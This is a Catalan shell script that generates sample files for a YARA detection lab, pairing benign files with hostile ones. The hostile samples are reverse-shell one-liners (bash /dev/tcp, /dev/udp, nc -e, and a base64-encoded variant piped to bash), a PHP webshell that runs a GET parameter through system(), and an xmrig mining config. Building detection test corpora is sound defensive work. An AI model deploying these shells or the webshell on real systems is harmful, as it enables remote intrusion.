#!/bin/bash

# lab06_preparar_entorn.sh — Genera les mostres del Lab 6 (YARA) al directori ./mostres

# Tots els fitxers són TEXT PLA inofensiu (mai s'executen)
# El contingut dels fitxers és determinista: tothom obté exactament els mateixos bytes, hashos i offsets

set -e
mkdir -p mostres && cd mostres

printf 'echo "Backup completed successfully"\ntar -czf backup.tar.gz /home/user/documents\n' > sample_clean.txt
printf 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > sample_suspicious1.txt
printf 'nc -e /bin/sh 10.0.0.1 4444\n' > sample_suspicious2.txt
printf 'sh -i >& /dev/udp/10.0.0.1/4444 0>&1\n' > sample_suspicious3.txt
printf '# Notes de l administrador\n# Per depurar el servei, obre una shell interactiva amb: bash -i\nsystemctl status apache2\n' > admin_notes.txt
printf 'Aquest fitxer de text conte \x7fELF al mig, pero no es un binari.\n' > fake_elf.txt
printf '<?php\nif (isset($_GET["c"])) { system($_GET["c"]); }\n?>\n' > webshell.php
printf '<?php\n$pagina = $_GET["p"] ?? "inici";\necho "Hola, benvingut a la pagina " . htmlspecialchars($pagina);\n?>\n' > index.php
printf '{\n  "pools": [\n    {"url": "stratum+tcp://pool1.example.net:3333"},\n    {"url": "stratum+tcp://pool2.example.net:3333"},\n    {"url": "stratum+tcp://pool3.example.net:4444"}\n  ],\n  "user": "xmrig-worker-01",\n  "donate-level": 1\n}\n' > config.json
printf 'rsync -e ssh /home/user/documents backup@srv:/bk\n' > rsync_backup.sh
printf 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK | base64 -d | bash\n' > encoded.sh

echo "Mostres creades a $(pwd):"
ls -l
